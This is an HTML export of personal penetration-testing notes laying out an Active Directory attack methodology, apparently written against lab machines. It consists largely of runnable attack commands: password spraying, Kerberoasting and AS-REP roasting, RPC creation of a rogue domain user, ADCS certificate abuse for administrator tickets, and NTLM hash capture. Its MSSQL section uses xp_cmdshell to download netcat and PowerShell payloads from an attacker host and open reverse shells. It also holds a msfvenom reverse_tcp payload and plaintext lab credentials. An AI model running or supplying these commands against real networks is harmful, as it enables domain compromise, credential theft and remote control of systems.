<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>01-Internal methodology with credentials</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>01-Internal methodology with credentials</h1><br/><p><h2>Ressources</h2></p><p><a href="https://github.com/ihebski/A-Red-Teamer-diaries">https://github.com/ihebski/A-Red-Teamer-diaries</a></p><p><strong><h3>My Methodology :</h3></strong><h3></h3></p><p><h3></h3></p><p><h2>1.smb (445)</h2></p><p>  <div class="codebox"><pre><span style="color:#0088ff;font-weight:400">## eternal blue windows xp ??</span><br />  * nmap --script=smb-vuln-ms17-010 <span style="color:#7f0044;font-weight:400">$target</span> <br />  <span style="color:#0088ff;font-weight:400">## Netbios </span><br />  nbtscan <span style="color:#7f0044;font-weight:400">$target</span>  <br /><span style="color:#0088ff;font-weight:400">## smbap  </span><br />  smbmap -H <span style="color:#7f0044;font-weight:400">$target</span> -u Null<br />  smbmap -u <span style="color:#3ad900;font-weight:400">&quot;guest&quot;</span> -p <span style="color:#3ad900;font-weight:400">&quot;&quot;</span> -H <span style="color:#7f0044;font-weight:400">$target</span><br />  * -R share <br />  *  smbmap -H 10.10.10.172 -u SABatchJobs -p SABatchJobs -R <span style="color:#3ad900;font-weight:400">&#39;users$&#39;</span><br />* crackmapexec smb <span style="color:#7f0044;font-weight:400">$target</span> <br /><span style="color:#0088ff;font-weight:400">## enum rids/users </span><br />    * crackmapexec smb <span style="color:#7f0044;font-weight:400">$target</span>  --rid-brute  <br />    <br /><span style="color:#0088ff;font-weight:400">## password spraying  </span><br />crackmapexec smb <span style="color:#7f0044;font-weight:400">$target</span> -u users -p <span style="color:#3ad900;font-weight:400">&#39;&#39;</span> --conntinue-on-success <br />crackmapexec smb <span style="color:#7f0044;font-weight:400">$target</span> -u users -p users --no-bruteforce --conntinue-on-success <br /><span style="color:#0088ff;font-weight:400">### if we can read IPC$ as anonymous</span><br />python3 /usr/share/doc/python3-impacket/examples/lookupsid.py anonymous@10.10.117.62 <span style="color:#ff9d00;font-weight:700">|</span> <span style="color:#ff9d00;font-weight:700">tee</span> users.txt<br /><span style="color:#0088ff;font-weight:400">## smbclient </span><br />smbclient -L <span style="color:#ff9d00;font-weight:700">&lt;</span>target ip<span style="color:#ff9d00;font-weight:700">&gt;</span> -U <span style="color:#7f0044;font-weight:400">$user</span><br />* smbclient -U svc-admin //10.10.10.182/data rY4n5eva<br /><br /><br />* change password<br />  * smbpasswd -r <span style="color:#7f0044;font-weight:400">$target</span> user<br /> <br /> <br /><span style="color:#0088ff;font-weight:400">##mount smb share</span><br /><span style="color:#ff9d00;font-weight:700">sudo</span> mount -t cifs -o username=hope.sharp //search.htb/RedirectedFolders$ ./mnt/<br />  <br />  <br /><span style="color:#0088ff;font-weight:400">## bruteforce accounts with no bruteforce </span><br /> crackmapexec smb <span style="color:#7f0044;font-weight:400">$target</span> -u users.txt -p users.txt --no-bruteforce<br /> <span style="color:#0088ff;font-weight:400">### for kerberos only add -k (when ntlm is disabled or if user is in protected users)</span><br /> <br /> <span style="color:#0088ff;font-weight:400">## spider share</span><br /> crackmapexec smb <span style="color:#7f0044;font-weight:400">$target</span> -u svc_apache -p <span style="color:#3ad900;font-weight:400">&#39;S@Ss!K@*t13&#39;</span> -M spider_plus --spider <span style="color:#7f0044;font-weight:400">$share</span><br /> <br /> <span style="color:#0088ff;font-weight:400">## dump users</span><br />  crackmapexec smb <span style="color:#7f0044;font-weight:400">$target</span> -u svc_apache -p <span style="color:#3ad900;font-weight:400">&#39;S@Ss!K@*t13&#39;</span> --users<br /> <br /> <span style="color:#0088ff;font-weight:400">## enumerate users </span><br /> crackmapexec smb <span style="color:#7f0044;font-weight:400">$target</span> -u <span style="color:#3ad900;font-weight:400">&#39;user&#39;</span> -p <span style="color:#3ad900;font-weight:400">&#39;PASS&#39;</span> --users<br /> <br /> <span style="color:#0088ff;font-weight:400">## smb exploits </span><br /> * <span style="color:#ff9d00;font-weight:700">cat</span> smbvulns.txt <span style="color:#ff9d00;font-weight:700">|grep</span> <span style="color:#3ad900;font-weight:400">&quot;VULNERABLE&quot;</span> -i <br /> *e.g https:<span style="color:#ff9d00;font-weight:700">//</span>www.exploit-db.com<span style="color:#ff9d00;font-weight:700">/</span>exploits<span style="color:#ff9d00;font-weight:700">/</span>40280<br />    * msfvenom -p windows/shell/reverse_tcp LHOST=192.168.4.238 LPORT=4444 EXITFUNC=thread -f c<br />    <br /><span style="color:#0088ff;font-weight:400">## only kerberos auth (ntlm disabled)</span><br />smbclient.py -k <span style="color:#7f0044;font-weight:400">$domain</span>/<span style="color:#7f0044;font-weight:400">$user</span>:<span style="color:#7f0044;font-weight:400">$password</span>@<span style="color:#7f0044;font-weight:400">$dc</span>-name -dc-ip <span style="color:#7f0044;font-weight:400">$dc</span><br /><br /><span style="color:#ff9d00;font-weight:700">&gt;&gt;</span> shares <br /><span style="color:#ff9d00;font-weight:700">&gt;&gt;</span> use <span style="color:#7f0044;font-weight:400">$share</span></pre></div><h3></h3></p><p><h3> </h3><h3></h3></p><p><h3></h3><h2> 3. ldap (389 and 636(ldaps))</h2><h3></h3></p><p><h3></h3><div class="codebox"><pre><span style="color:#0088ff;font-weight:400">### nmap</span><br />nmap -sV --script <span style="color:#3ad900;font-weight:400">&quot;ldap* and not brute&quot;</span> <span style="color:#7f0044;font-weight:400">$target</span><br /><span style="color:#0088ff;font-weight:400">## checking if the LDAP service allows anonymous binds using the ldapsearch tool</span><br />ldapsearch -x -H LDAP://<span style="color:#7f0044;font-weight:400">$target</span> -s base namingcontexts <br />ldapsearch -x -H LDAP://<span style="color:#7f0044;font-weight:400">$target</span> -b <span style="color:#3ad900;font-weight:400">&quot;DC=hutch,DC=offsec&quot;</span> <span style="color:#3ad900;font-weight:400">&#39;(objectClass=person)&#39;</span> <span style="color:#ff9d00;font-weight:700">&gt;</span> ldap-people<br /><span style="color:#0088ff;font-weight:400">### user accounts </span><br />ldapsearch -x -H LDAP://<span style="color:#7f0044;font-weight:400">$targe</span> -W <span style="color:#3ad900;font-weight:400">&quot;objectclass=account&quot;</span> <br />ldapsearch -x -b <span style="color:#3ad900;font-weight:400">&quot;DC=thinc,DC=local&quot;</span> -H ldap://<span style="color:#7f0044;font-weight:400">$target</span><br /><span style="color:#0088ff;font-weight:400">## when we have creds</span><br />ldapsearch -b <span style="color:#3ad900;font-weight:400">&quot;DC=thinc,DC=local&quot;</span> -H ldap://<span style="color:#7f0044;font-weight:400">$target</span> -D <span style="color:#3ad900;font-weight:400">&#39;support@blackfield.local&#39;</span> -w <span style="color:#3ad900;font-weight:400">&#39;BlackKnight&#39;</span> // when we have creds<br /><br />ldapdomaindump -u <span style="color:#3ad900;font-weight:400">&#39;hutch.offsec\fmcsorley&#39;</span> -p <span style="color:#3ad900;font-weight:400">&#39;CrabSharkJellyfish192&#39;</span> <span style="color:#7f0044;font-weight:400">$target</span> -o ldap/<br />ldapsearch -h <span style="color:#7f0044;font-weight:400">$target</span> -D <span style="color:#3ad900;font-weight:400">&#39;support@.htb&#39;</span> -w <span style="color:#3ad900;font-weight:400">&quot;IsolationIsKey?&quot;</span> -b <span style="color:#3ad900;font-weight:400">&quot;DC=search,DC=htb&quot;</span><br />ldapsearch -v -x -b <span style="color:#3ad900;font-weight:400">&quot;DC=support,DC=htb&quot;</span> -H <span style="color:#3ad900;font-weight:400">&quot;ldap://$IP&quot;</span> <span style="color:#3ad900;font-weight:400">&quot;(objectclass=*)&quot;</span>  -D <span style="color:#3ad900;font-weight:400">&quot;support\\ldap&quot;</span> -w <span style="color:#3ad900;font-weight:400">&#39;nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz&#39;</span> <span style="color:#ff9d00;font-weight:700">|</span> <span style="color:#ff9d00;font-weight:700">grep</span> <br /> <br /><span style="color:#0088ff;font-weight:400">## checking for creds of service</span><br /> <span style="color:#ff9d00;font-weight:700">sudo</span> /opt/ADscripts/gMSADumper.py -u Ted.Graves -p <span style="color:#3ad900;font-weight:400">&#39;Mr.Teddy&#39;</span> -d intelligence.htb<br /> <br /> <span style="color:#0088ff;font-weight:400">## windows</span><br /> <br /> into Settings <span style="color:#ff9d00;font-weight:700">&gt;</span> Apps <span style="color:#ff9d00;font-weight:700">&gt;</span> Optional Features <span style="color:#ff9d00;font-weight:700">&gt;</span> More Windows Features <br /> and add “Active Driectory Lightweight Directory Services”:</pre></div></p><p> </p><p><h3></h3></p><p><h3></h3><h2> 4.RPC</h2></p><p> <div class="codebox"><pre>enum4linux -a <span style="color:#7f0044;font-weight:400">$target</span> <br />rpcclient -U <span style="color:#3ad900;font-weight:400">&quot;&quot;</span> -N <span style="color:#7f0044;font-weight:400">$target</span> <span style="color:#0088ff;font-weight:400">## get the password policy , domain names ... (Null auth </span><br />      ▪ enumdomusers <span style="color:#0088ff;font-weight:400">## get all users</span><br />      ▪ enumdomgroups<br />      ▪ enumprinters <br />      ▪ querydispinfo <span style="color:#0088ff;font-weight:400">## query display info (description ...)</span><br />      ▪ querygroup <span style="color:#7f0044;font-weight:400">$group</span><br />      ▪ queryuser <span style="color:#7f0044;font-weight:400">$user</span> <br />      ▪ <span style="color:#0088ff;font-weight:400">## create domain users</span><br />         - createdomuser hacker<br />         - setuserinfo2 hacker 24 Password@1<br />         - enumdomusers</pre></div></p><p> <ol><li><h3>5. </h3><h2>5. kerberos :</h2><h3></h3></p><p><h3></h3></li></ol><a name="h3-24"></a></p><p><div class="codebox"><pre><span style="color:#0088ff;font-weight:400">## kerberos brute force on usernames </span><br /><br />kerbrute userenum -d <span style="color:#7f0044;font-weight:400">$domain</span> /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt --dc <span style="color:#7f0044;font-weight:400">$target</span><br /><span style="color:#ff9d00;font-weight:700">for</span> <span style="color:#7f0044;font-weight:400">i</span> <span style="color:#ff9d00;font-weight:700">in</span> <span style="color:#333333;font-weight:400">$(cat users.txt)</span><span style="color:#ff9d00;font-weight:700">;do</span>  kerbrute bruteuser --dc <span style="color:#7f0044;font-weight:400">$target</span> -d <span style="color:#7f0044;font-weight:400">$domain</span> ./wordlist <span style="color:#7f0044;font-weight:400">$i</span><span style="color:#ff9d00;font-weight:700">;done</span><br /><br /><span style="color:#0088ff;font-weight:400">## kerberos pass spray</span><br />kerbrute passwordspray users.txt <span style="color:#7f0044;font-weight:400">$pass</span> -d <span style="color:#7f0044;font-weight:400">$domain</span> --dc <span style="color:#7f0044;font-weight:400">$target</span><br /><br /><span style="color:#0088ff;font-weight:400">## kereberoasting (creds needes)</span><br /><br />GetUserSPNs.py -request -dc-ip <span style="color:#7f0044;font-weight:400">$target</span> <span style="color:#7f0044;font-weight:400">$domain</span>/<span style="color:#7f0044;font-weight:400">$user</span> -save -outputfile GetUserSPNs.out <br />GetUserSPNs.py -request -dc-ip <span style="color:#7f0044;font-weight:400">$target</span> <span style="color:#7f0044;font-weight:400">$domain</span>/fmcsorley -save -outputfile GetUserSPNs.out<br /><br /><span style="color:#0088ff;font-weight:400">### -k for kerberoast auth </span><br /><br /><span style="color:#0088ff;font-weight:400">## ASREPROASTING (need list of users + creds)</span><br /><br />GetNPUsers.py -no-pass -dc-ip <span style="color:#7f0044;font-weight:400">$target</span> <span style="color:#3ad900;font-weight:400">&quot;$domain&quot;</span>/<span style="color:#7f0044;font-weight:400">$user</span> -request <span style="color:#ff9d00;font-weight:700">|</span> <span style="color:#ff9d00;font-weight:700">grep</span> -v Impacket<span style="color:#ff9d00;font-weight:700">;</span> <br /><br /><span style="color:#ff9d00;font-weight:700">for</span> <span style="color:#7f0044;font-weight:400">user</span> <span style="color:#ff9d00;font-weight:700">in</span> <span style="color:#333333;font-weight:400">$(cat users.txt)</span><span style="color:#ff9d00;font-weight:700">;do</span> <span style="color:#ff9d00;font-weight:700">echo</span> <span style="color:#7f0044;font-weight:400">$user</span><span style="color:#ff9d00;font-weight:700">;</span>GetNPUsers.py -no-pass -dc-ip <span style="color:#7f0044;font-weight:400">$target</span> <span style="color:#3ad900;font-weight:400">&quot;$domain&quot;</span>/<span style="color:#7f0044;font-weight:400">$user</span> -request <span style="color:#ff9d00;font-weight:700">|</span> <span style="color:#ff9d00;font-weight:700">grep</span> -v Impacket<span style="color:#ff9d00;font-weight:700">;done;</span><br />.<span style="color:#333333;font-weight:400">\R</span>ubeus.exe asreproast<br /><br /><span style="color:#0088ff;font-weight:400">## Attacking kerberos resources </span><br /><span style="color:#0088ff;font-weight:400">### https://m0chan.github.io/2019/07/31/How-To-Attack-Kerberos-101.html</span><br />   ◇  Kerberos MS14–06<br />   ◇  Goldenpac.py<br />      ▪  unconstrained delegation attack <br />         -  1. Compromise a Server trusted for Unconstrained Delegation via a admin or service account.<br />         - 2. Dump tickets with PS C:<span style="color:#333333;font-weight:400">\U</span>sers<span style="color:#333333;font-weight:400">\m</span>0chan<span style="color:#ff9d00;font-weight:700">&gt;</span> Rubeus.exe dump<br />         - 3. If a Domain Admin has authenticated through this Server then RIP: Social Engineer a Domain Admin to Authenticate to this Server<br />         -  4. Perform a PTT attack with recovered TGT<br /><br /><span style="color:#0088ff;font-weight:400">## notes </span><br />* <span style="color:#ff9d00;font-weight:700">in</span> <span style="color:#ff9d00;font-weight:700">case</span> of clock skew <span style="color:#ff9d00;font-weight:700">&gt;</span> xheures <span style="color:#ff9d00;font-weight:700">;</span> we have to set our current time so that kerberos works </pre></div></p><p>   </p><p><h2> 6. dns : dnstool</h2></p><p><div class="codebox"><pre><span style="color:#0088ff;font-weight:400">## Basic enum dns </span><br /><br />dig axfr @<span style="color:#3ad900;font-weight:400">&quot;</span><span style="color:#7f0044;font-weight:400">$target</span><span style="color:#3ad900;font-weight:400">&quot;</span> <span style="color:#7f0044;font-weight:400">$domain</span> // dns zone transfer<br />host -a -l <span style="color:#7f0044;font-weight:400">$target</span> <span style="color:#7f0044;font-weight:400">$domain</span><br />dnsrecon -d specialHost -n <span style="color:#ff9d00;font-weight:700">&lt;</span>ip address of the nameserver<span style="color:#ff9d00;font-weight:700">&gt;</span><br />dnsrecon -d <span style="color:#7f0044;font-weight:400">$target</span> -r <span style="color:#7f0044;font-weight:400">$range</span> <br /><br /><span style="color:#0088ff;font-weight:400">## Add/modify/delete Active Directory Integrated DNS records via LDAP.</span><br /><span style="color:#ff9d00;font-weight:700">/</span>opt<span style="color:#ff9d00;font-weight:700">/</span>ADscripts<span style="color:#ff9d00;font-weight:700">/</span>dnstool.py -u <span style="color:#3ad900;font-weight:400">&#39;intelligence.htb\Tiffany.Molina&#39;</span> -p <span style="color:#3ad900;font-weight:400">&#39;NewIntelligenceCorpUser9876&#39;</span> -a add -r <span style="color:#3ad900;font-weight:400">&#39;weboops.intelligence.htb&#39;</span> -d <span style="color:#ff9d00;font-weight:700">&lt;</span>YOUR IP<span style="color:#ff9d00;font-weight:700">&gt;</span> <span style="color:#ff9d00;font-weight:700">&lt;</span>MACHINE IP<span style="color:#ff9d00;font-weight:700">&gt;</span><br /><span style="color:#0088ff;font-weight:400">### used with responder if for example we know that there is cron jobh that is calling some sort of domain name </span></pre></div><h3></h3></p><p><h3>  </h3></p><p><h3></h3></p><p><h3></h3><h2> 7. attacking MSSQL </h2><h3> </h3><div class="codebox"><pre><span style="color:#0088ff;font-weight:400">## xp_cmshell with creds of sql_svc AD </span><br />proxychains -q mssqlclient.py svc_mssql:trustno1@<span style="color:#7f0044;font-weight:400">$target</span> -windows-auth<br />EXECUTE sp_configure <span style="color:#3ad900;font-weight:400">&#39;show advanced options&#39;</span>, 1<span style="color:#ff9d00;font-weight:700">;</span><br />RECONFIGURE<span style="color:#ff9d00;font-weight:700">;</span><br />EXECUTE sp_configure <span style="color:#3ad900;font-weight:400">&#39;xp_cmdshell&#39;</span>, 1<span style="color:#ff9d00;font-weight:700">;</span><br />RECONFIGURE<span style="color:#ff9d00;font-weight:700">;</span><br />EXECUTE xp_cmdshell <span style="color:#3ad900;font-weight:400">&#39;whoami&#39;</span><span style="color:#ff9d00;font-weight:700">;</span><br /><span style="color:#0088ff;font-weight:400">#EXEC xp_cmdshell &#39;echo IEX (New-Object Net.WebClient).DownloadString(&quot;</span><span style="color:#7f0044;font-weight:400">http://192.168.119.169/revshell.ps1&quot;</span><span style="color:#0088ff;font-weight:400">) | powershell -noprofile&#39;;</span><br />EXEC master..xp_cmdshell <span style="color:#3ad900;font-weight:400">&#39;certuril -urlcache -split -f http://$lhost/nc.exe c:/users/public/nc.exe&#39;</span><span style="color:#ff9d00;font-weight:700">;</span><br />EXEC xp_cmdshell <span style="color:#3ad900;font-weight:400">&#39;C:\Users\public\nc.exe $lhost -e cmd.exe&#39;</span><br /><br /><span style="color:#0088ff;font-weight:400">## no pass</span><br /><br />sqsh -S <span style="color:#ff9d00;font-weight:700">&lt;</span>IP<span style="color:#ff9d00;font-weight:700">&gt;</span> -U <span style="color:#ff9d00;font-weight:700">&lt;</span>Username<span style="color:#ff9d00;font-weight:700">&gt;</span> -P <span style="color:#ff9d00;font-weight:700">&lt;</span>Password<span style="color:#ff9d00;font-weight:700">&gt;</span> -D <span style="color:#ff9d00;font-weight:700">&lt;</span>Database<span style="color:#ff9d00;font-weight:700">&gt;</span><br /><br /><br /><span style="color:#0088ff;font-weight:400">## with password method 1 : cmdline </span><br />mssqlclient.py <span style="color:#7f0044;font-weight:400">$user</span>@10.10.10.52<br />  <span style="color:#ff9d00;font-weight:700">&gt;</span> SELECT name FROM master.sys.databases<span style="color:#ff9d00;font-weight:700">;</span><br />  <span style="color:#ff9d00;font-weight:700">&gt;</span> use table <span style="color:#ff9d00;font-weight:700">;</span><br />  <span style="color:#ff9d00;font-weight:700">&gt;</span> SELECT * FROM information_schema.tables<span style="color:#ff9d00;font-weight:700">;</span><br />  <span style="color:#ff9d00;font-weight:700">&gt;</span> SELECT * FROM information_schema.columns where TABLE_NAME=<span style="color:#3ad900;font-weight:400">&#39;blog_Orchard_Users_UserPartRecord&#39;</span><br /> <br /><span style="color:#0088ff;font-weight:400">## with password method 1 : cmdline </span><br />  <br />dbeaver <span style="color:#0088ff;font-weight:400">## universal databse manager </span><br /><br /><span style="color:#0088ff;font-weight:400">## get netntlmv2 hash :  xp_dirtree SQL Server Stored Procedure </span><br />* smbserver.py .-smb2support <br />* xp_dirtree <span style="color:#3ad900;font-weight:400">&#39;\\10.10.14.2\share&#39;</span><br /></pre></div></p><p></p><p><h2> 7. responder :</h2><ul><li> T<h3>o sniff for a hash of a owned user or other users </h3></li><li><h3>open it when you force the victim to connect to you via smb (e.g RCE or sql injection mssql)</h3></li></ul><h3></h3></p><p><h3></h3><ol><li><h3>8. </h3><h2>8. SMTP : phishing</h2></li><li><h3>send a malicious payload</h3></li></ol><h3></h3></p><p><h3>  </h3><ol><li><h3>9. </h3><h2>9. crackmapexec smb / winrm // bruteforce attack</h2><h3> </h3></li><li><h3>• </h3><small>•  (we can use hashcat to generate a custom wordlist from the user list) ; --pass-pol to check the password policy to see if account lockout treshold is none or there is limited attempt number</small></li><li><small>crackmapexec smb -u users.txt -p rY4n5eva --shares $target</small></li><li><small>crackmapexec smb $target -u users -p passwords --no-bruteforce // sequential passwords spraying </small><ul><li><small>crackmapexec smb $target -u users -P wordlist.txt</small></li></ul></li></ol><h3></h3></p><p><h3> </h3><h3></h3></p><p><h3> </h3><h2>10. The GetNPUsers.py script from Impacket </h2><ul><li> <small>can be used to request a TGT ticket and dump the</small></li></ul><small></small></p><p><small> hash. (if pre auth is disabled )if Pre-auth is disabled on auser =&gt; AS-REPROASTING =&gt; get TGT encrypted with NTLM hash and try tpo bruteforce it</small><h3></h3></p><p><h3> </h3><h3></h3></p><p><h3> </h3><h3></h3></p><p><h3></h3><h2> 11. zerologon</h2><h3></h3></p><p><h3></h3></p><p><ul><li><a href="https://github.com/risksense/zerologon">https://github.com/risksense/zerologon</a></li></ul></p><p><ol><li>12. <h2>12. printer</h2></li><li><h2>• </h2>• CVE-2021-34527 : printnightmare<ul><li>l existe une vulnérabilité d’exécution de code à distance quand le service Spouleur d’impression Windows effectue de manière incorrecte des opérations privilégiées sur les fichiers.</li><li>require user:password</li></ul></li></ol><h2></h2></p><p><h2> 12. evil-winrm (5985)</h2></p><p> <ul><li>evil-winrm -i $target -u mhope -p &#39;4n0therD4y@n0th3r$&#39;</li></ul></p><p><h3></h3></p><p><h3> </h3><h2>13. if we get non shell creds : </h2><ul><li> <h3>smb , rpc , kerberoast attack  , ldap , silver attacks (if we have a service)!!!</h3></li></ul><h3></h3></p><p><h3></h3><ol><li><h3>14. </h3><h2>14. guess passwords</h2></li><li><h3>  e.g : match each user with its password or with a list of simple passwords</h3></li></ol><h3></h3></p><p><h3></h3></p><p><ol><li>15. <h2>15. enumerate ADCS</h2></li><li></li></ol><div class="codebox"><pre><span style="color:#0088ff;font-weight:400"># identify its presence</span><br />crackmapexec ldap 10.10.11.202 -u ryan.cooper -p NuclearMosquito3 -M adcs<br /><span style="color:#0088ff;font-weight:400">## ON THE DC</span><br />.<span style="color:#333333;font-weight:400">\C</span>ertify.exe <span style="color:#ff9d00;font-weight:700">find</span> /vulnerable /currentuser<br /><br /><span style="color:#0088ff;font-weight:400"># Exploit SAN authy certificate if we can enrol on it </span><br /><span style="color:#0088ff;font-weight:400">## e msPKI-CertificateName-Flag is present and contains ENROLLEE_SUPPLIES_OBJECt</span><br />.<span style="color:#333333;font-weight:400">\C</span>ertify.exe request /ca:dc.sequel.htb<span style="color:#333333;font-weight:400">\s</span>equel-DC-CA /template:<span style="color:#7f0044;font-weight:400">$template</span> /altname:administrator<br /><br /><span style="color:#0088ff;font-weight:400"># convert to pfx </span><br />openssl pkcs12 -in cert.pem -keyex -CSP <span style="color:#3ad900;font-weight:400">&quot;Microsoft Enhanced Cryptographic Provider v1.0&quot;</span> -export -out cert.pfx<br /><span style="color:#0088ff;font-weight:400"># .\Rubeus.exe asktgt /user:administrator /certificate:C:\programdata\cert.pfx</span><br />.<span style="color:#333333;font-weight:400">\R</span>ubeus.exe asktgt /user:administrator /certificate:c:<span style="color:#333333;font-weight:400">\t</span>emp<span style="color:#333333;font-weight:400">\c</span>ert.pfx<br /><br /><span style="color:#0088ff;font-weight:400"># either inject tgt ptt or get creds</span><br />.<span style="color:#333333;font-weight:400">\R</span>ubeus.exe asktgt /user:administrator /certificate:c:<span style="color:#333333;font-weight:400">\t</span>emp<span style="color:#333333;font-weight:400">\c</span>ert.pfx /getcredentials /show /nowrap<br /><br /></pre></div></p></div>
</body>
</html>
